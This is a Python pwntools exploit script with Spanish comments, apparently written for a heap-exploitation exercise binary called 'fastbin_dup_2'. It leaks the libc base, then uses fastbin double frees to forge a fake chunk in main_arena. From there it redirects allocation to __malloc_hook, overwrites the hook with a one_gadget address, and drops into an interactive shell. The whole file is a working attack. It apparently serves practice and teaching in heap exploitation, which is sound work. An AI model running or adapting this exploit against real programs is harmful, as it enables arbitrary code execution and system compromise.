#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again
context.log_level = "DEBUG"
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.
# ===========================================================================
# =-=-=- EXAMPLE -=-=-=
# 1- PRIMER FASTBIN DUP
# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, b"A"*0x48)
chunk_B = malloc(0x48, b"B"*0x48)
# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)
# START ALL PWNING
# SOBRESCRIBIR EL FD CON UN FAKE SIZE DE 0X61 PARA USAR UN FAST BIN DE 0X70 PARA APLICAR
# EL TRUCO DEL FASTBIN 0X70
malloc(0x48,p64(0x61))  # <------- esto escribo
#AHORA CON LOS SIGUIENTES MALLOCS SE QUEDARA EL 0X61 EN LA MAIN ARENA
malloc(0x48,'C'*48)
malloc(0x48,'D'*48)

#2- SEGUNDO FASTBIN
# MEZCLAR EL FAKE CHUNK DE LA ARENA EN EL FASTBIN  DE 0X60
chunk_J=malloc(0X58,'C'*48)
chunk_K=malloc(0x58,'D'*48)
free(chunk_J)
free(chunk_K)
free(chunk_J)
# !!! PARA EVITAR QUE NOS REDIRECCIONE A 0X61 ya no pediremos
# !!! CUNKS DE 0X48 (72) bytes
# Ahora si escribir lo que enlazaras
malloc(0x58, p64( libc.sym.main_arena + 0x20 ))
# Mover el fake chunk falso a los fastbin y ponerlo en el head de los fastbins 0x60
malloc(0x58,b'-s\0')
malloc(0x58,b'M'*8)
# ahora podemos armar el facke chunk por que ya tenemos el check size
# y podemos escribir en la main arena en el siguiente chunk que solicitemos
# con un mallos de 0x58 de lo ultimo que quedo en bin 
#lo siguiente sobrescribira en el top chunk para que el siguiente malloc
#nos regrese el fake chunk
malloc(0x58,b'Y'*48+p64(libc.sym.__malloc_hook -35))
#hasta adq mainhora llevamos un fake chunk en main arena para escribir en malloc_hook
#el top chunk nos regresa el malloc hook para escribir en el
# este malloc hook se sobrescribira aunque estemos algo atras con un pad de 19

#malloc(0x28,b'Y'*19+p64(0xdeadbeef))
malloc(0x28,b'Y'*19+p64(libc.address + 0xe1fa1))

malloc(0x28,b'')
# Puede ser complejo por que al mismo tiempo que creamos un fake chunk en el main
# arena, seguimos tambien utilizando los fastbin tanto como para mantener una
# direccion para armar el fake chunk, tanto como para escribir en ellos
# =============================================================================
io.interactive()
